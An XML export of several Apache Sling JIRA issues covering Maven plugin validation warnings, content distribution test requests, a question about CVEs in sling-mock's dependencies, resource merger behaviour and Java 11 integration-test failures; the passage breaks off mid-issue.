                <link>https://issues.apache.org/jira/browse/SLING-11992</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Since Maven 3.9.2, a plugin validation warning is reported at the end of each Maven build.&lt;/p&gt;

&lt;p&gt;A snippet of the output:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
[WARNING] &#160;* org.apache.sling:htl-maven-plugin:2.0.4-1.4.0
...
[WARNING] &#160; Plugin issue(s):
[WARNING] &#160; &#160;* Plugin should declare these Maven artifacts in `provided` scope: [org.apache.maven:maven-artifact:3.3.9, org.apache.maven:maven-settings-builder:3.3.9, org.apache.maven:maven-repository-metadata:3.3.9, org.apache.maven:maven-builder-support:3.3.9, org.apache.maven:maven-core:3.3.9, org.apache.maven:maven-aether-provider:3.3.9, org.apache.maven:maven-settings:3.3.9, org.apache.maven:maven-plugin-api:3.3.9, org.apache.maven:maven-model-builder:3.3.9, org.apache.maven:maven-model:3.3.9]
...
[WARNING] Fix reported issues by adjusting plugin configuration or by upgrading above listed plugins. If no upgrade available, please notify plugin maintainers about reported issues.&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This should be fixed in order for the plugin to be compatible with Maven 4.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13546012">SLING-11992</key>
            <summary>Maven 3.9.2+ reports plugin validation issue on htl-maven-plugin</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="wim.symons">Wim Symons</reporter>
                        <labels>
                    </labels>
                <created>Thu, 3 Aug 2023 14:44:47 +0000</created>
                <updated>Wed, 21 May 2025 12:05:03 +0000</updated>
                                            <version>HTL Maven Plugin 2.0.4-1.4.0</version>
                                    <fixVersion>HTL Maven Plugin 2.0.6-1.4.0</fixVersion>
                                    <component>Maven Plugins and Archetypes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17754115" author="rombert" created="Mon, 14 Aug 2023 14:19:20 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=wim.symons&quot; class=&quot;user-hover&quot; rel=&quot;wim.symons&quot;&gt;wim.symons&lt;/a&gt; - can you give &lt;a href=&quot;https://github.com/apache/sling-htl-maven-plugin/pull/4&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-htl-maven-plugin/pull/4&lt;/a&gt; a spin and see if it fixes your problem?&lt;/p&gt;</comment>
                            <comment id="17952909" author="rombert" created="Tue, 20 May 2025 15:58:16 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=wim.symons&quot; class=&quot;user-hover&quot; rel=&quot;wim.symons&quot;&gt;wim.symons&lt;/a&gt; - did you get the time to report the potential fix?&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310051">
                    <name>Supercedes</name>
                                                                <inwardlinks description="is superceded by">
                                        <issuelink>
            <issuekey id="13580845">SLING-12338</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            22 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1jkig:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11990] Fix TEST distribution requests</title>
                <link>https://issues.apache.org/jira/browse/SLING-11990</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Currently test requests do not work as they do not have a path.&lt;/p&gt;

&lt;p&gt;So they fail with exception saying &quot;Empty paths&quot;.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13545873">SLING-11990</key>
            <summary>Fix TEST distribution requests</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cschneider">Christian Schneider</assignee>
                                    <reporter username="cschneider">Christian Schneider</reporter>
                        <labels>
                    </labels>
                <created>Wed, 2 Aug 2023 14:29:26 +0000</created>
                <updated>Thu, 21 Sep 2023 13:06:01 +0000</updated>
                            <resolved>Wed, 2 Aug 2023 14:35:59 +0000</resolved>
                                                    <fixVersion>Content Distribution Journal Core 0.2.0</fixVersion>
                                    <component>Content Distribution</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 12 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1jjnk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11989] Allow empty paths for TEST request type</title>
                <link>https://issues.apache.org/jira/browse/SLING-11989</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Currently when we execute a distribution request with an empty path an exception is thrown. We need to allow empty paths for the requests that have the type `TEST` because the &quot;Test connection&quot; link from the content distribution UI fails with the `Empty paths` exception.&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13545868">SLING-11989</key>
            <summary>Allow empty paths for TEST request type</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="balasoiu">Roxana-Elena Balasoiu</reporter>
                        <labels>
                    </labels>
                <created>Wed, 2 Aug 2023 13:51:26 +0000</created>
                <updated>Wed, 2 Aug 2023 13:51:26 +0000</updated>
                                                                            <component>Content Distribution</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 12 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1jjmg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11988] Apache Sling Testing Sling Mock Core Vulnerabilities</title>
                <link>https://issues.apache.org/jira/browse/SLING-11988</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Hello Apache Sling team,&lt;/p&gt;

&lt;p&gt;The latest&#160;&lt;a href=&quot;https://mvnrepository.com/artifact/org.apache.sling/org.apache.sling.testing.sling-mock.core&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;Apache Sling Testing Sling Mock Core&lt;/a&gt;&#160;version 3.4.10 (&lt;a href=&quot;https://mvnrepository.com/artifact/org.apache.sling/org.apache.sling.testing.sling-mock.core/3.4.10&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://mvnrepository.com/artifact/org.apache.sling/org.apache.sling.testing.sling-mock.core/3.4.10&lt;/a&gt;) that was released in May 2023 currently has these 3 vulnerabilities:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25621&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;CVE-2023-25621&lt;/a&gt;&lt;br/&gt;
&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32549&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;CVE-2022-32549&lt;/a&gt;&lt;br/&gt;
&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29425&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;CVE-2021-29425&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Can you please share your timeline on when the above vulnerabilities will be fixed?&#160;&lt;/p&gt;

&lt;p&gt;Thanks!&lt;/p&gt;</description>
                <environment></environment>
        <key id="13545360">SLING-11988</key>
            <summary>Apache Sling Testing Sling Mock Core Vulnerabilities</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="11">Done</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="nok001">Nok Arrenu</reporter>
                        <labels>
                    </labels>
                <created>Sat, 29 Jul 2023 00:00:07 +0000</created>
                <updated>Wed, 16 Aug 2023 07:38:36 +0000</updated>
                            <resolved>Wed, 16 Aug 2023 07:38:36 +0000</resolved>
                                                                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17754064" author="sseifert@pro-vision.de" created="Mon, 14 Aug 2023 11:56:44 +0000"  >&lt;p&gt;you are referencing to security issues reported for dependencies of sling-mock, not for sling-mock itself.&lt;/p&gt;

&lt;p&gt;as far as i see the CVEs relate to these dependencies:&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25621&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;CVE-2023-25621&lt;/a&gt; -&amp;gt; &lt;a href=&quot;https://repo1.maven.org/maven2/org/apache/sling/org.apache.sling.i18n/&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://repo1.maven.org/maven2/org/apache/sling/org.apache.sling.i18n/&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32549&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;CVE-2022-32549&lt;/a&gt; -&amp;gt; &lt;a href=&quot;https://repo1.maven.org/maven2/org/apache/sling/org.apache.sling.api/&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://repo1.maven.org/maven2/org/apache/sling/org.apache.sling.api/&lt;/a&gt; and &lt;a href=&quot;https://repo1.maven.org/maven2/org/apache/sling/org.apache.sling.commons.log/&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://repo1.maven.org/maven2/org/apache/sling/org.apache.sling.commons.log/&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29425&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;CVE-2021-29425&lt;/a&gt; -&amp;gt; &lt;a href=&quot;https://repo1.maven.org/maven2/commons-io/commons-io/&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://repo1.maven.org/maven2/commons-io/commons-io/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;for backwards compatibility reasons sling-mock comes with transitive dependencies to older versions of those libraries, but it is usual best practice to mange those dependencies in you project scope to use the versions actually used/deployed in your application. for example, if you are using it in an AEM project, here is a recommendation to do this: &lt;a href=&quot;https://wcm.io/testing/aem-mock/usage-maven-dependencies.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://wcm.io/testing/aem-mock/usage-maven-dependencies.html&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17754075" author="sseifert@pro-vision.de" created="Mon, 14 Aug 2023 12:26:19 +0000"  >&lt;p&gt;as part of &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11999&quot; title=&quot;sling-mock: Update to commons-io 2.11.0 and commons-fileupload 1.5&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11999&quot;&gt;&lt;del&gt;SLING-11999&lt;/del&gt;&lt;/a&gt; the commons-io dependency will be updated to a more recent version&lt;/p&gt;</comment>
                            <comment id="17754844" author="JIRAUSER301392" created="Wed, 16 Aug 2023 03:18:40 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; - Thank you so much for responding to this ticket and recommending a possible solution for us.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13547249">SLING-11999</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 10 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1jghk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11984] Sling Resource Merger takes current node structure into consideration (not only parent) when determining inclusion/exclusions of nodes with sling:hideChildren</title>
                <link>https://issues.apache.org/jira/browse/SLING-11984</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;It seems that the following node structure:&lt;/p&gt;

&lt;p&gt;/apps/test&lt;br/&gt;
+ a&lt;br/&gt;
+ b&lt;br/&gt;
+ c&lt;/p&gt;

&lt;p&gt;/apps/test2 (sling:resourceSuperType=/apps/test)&lt;br/&gt;
(sling:hideChildren=!a,!b,*)&lt;br/&gt;
+ a (with modifications)&lt;br/&gt;
+ d (newly defined)&lt;/p&gt;

&lt;p&gt;results in:&lt;br/&gt;
a,b&lt;br/&gt;
instead of&lt;br/&gt;
a,b,d&lt;/p&gt;

&lt;p&gt;The d node was added additionally (i.e. a tab in a dialog). It does not make sense to me that we would need to add it in the whitelist of children that we do not want to hide. To me, it seems that sling:hideChildren should only act on what is defined in the parent, not on what is defined in the current structure.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13544638">SLING-11984</key>
            <summary>Sling Resource Merger takes current node structure into consideration (not only parent) when determining inclusion/exclusions of nodes with sling:hideChildren</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="Henry Kuijpers">Henry Kuijpers</reporter>
                        <labels>
                    </labels>
                <created>Mon, 24 Jul 2023 10:46:04 +0000</created>
                <updated>Mon, 24 Jul 2023 10:46:21 +0000</updated>
                                            <version>Resource Merger 1.4.0</version>
                                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                    <issuelinks>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                                                <inwardlinks description="is caused by">
                                        <issuelink>
            <issuekey id="13359536">SLING-10150</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 13 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1jc1s:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11981] Java 11 causes ITs with Tinybundles 3.0.0 to fail</title>
                <link>https://issues.apache.org/jira/browse/SLING-11981</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;While updating to the latest parent, I found pax exam-based integration tests to fail. &lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[ERROR] Tests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 5.107 s &amp;lt;&amp;lt;&amp;lt; FAILURE! - in org.apache.sling.servlets.resolver.it.ServletResourceIT
[ERROR] org.apache.sling.servlets.resolver.it.ServletResourceIT  Time elapsed: 4.931 s  &amp;lt;&amp;lt;&amp;lt; ERROR!
org.ops4j.pax.exam.TestContainerException: There are unresolved bundles. See previous ERROR log messages for details.
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;ERROR: Bundle BuildByTinyBundles5ef75f77-5f6a-4470-9801-53e7e0f77603 [85] Error starting file:/home/joerg/repos/sling-git/sling-org-apache-sling-servlets-resolver/target/paxexam/ServletResourceIT/a882a707-4dfe-48d2-ba47-2b4175d777c3/pax-exam-downloads/BuildByTinyBundles5ef75f77-5f6a-4470-9801-53e7e0f77603_0.jar (org.osgi.framework.BundleException: Unable to resolve BuildByTinyBundles5ef75f77-5f6a-4470-9801-53e7e0f77603 [85](R 85.0): missing requirement [BuildByTinyBundles5ef75f77-5f6a-4470-9801-53e7e0f77603 [85](R 85.0)] osgi.ee; (osgi.ee=UNKNOWN) Unresolved requirements: [[BuildByTinyBundles5ef75f77-5f6a-4470-9801-53e7e0f77603 [85](R 85.0)] osgi.ee; (osgi.ee=UNKNOWN)])
org.osgi.framework.BundleException: Unable to resolve BuildByTinyBundles5ef75f77-5f6a-4470-9801-53e7e0f77603 [85](R 85.0): missing requirement [BuildByTinyBundles5ef75f77-5f6a-4470-9801-53e7e0f77603 [85](R 85.0)] osgi.ee; (osgi.ee=UNKNOWN) Unresolved requirements: [[BuildByTinyBundles5ef75f77-5f6a-4470-9801-53e7e0f77603 [85](R 85.0)] osgi.ee; (osgi.ee=UNKNOWN)]
        at org.apache.felix.framework.Felix.resolveBundleRevision(Felix.java:4398)
        at org.apache.felix.framework.Felix.startBundle(Felix.java:2308)
        at org.apache.felix.framework.Felix.setActiveStartLevel(Felix.java:1566)
        at org.apache.felix.framework.FrameworkStartLevelImpl.run(FrameworkStartLevelImpl.java:297)
        at java.base/java.lang.Thread.run(Thread.java:829)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

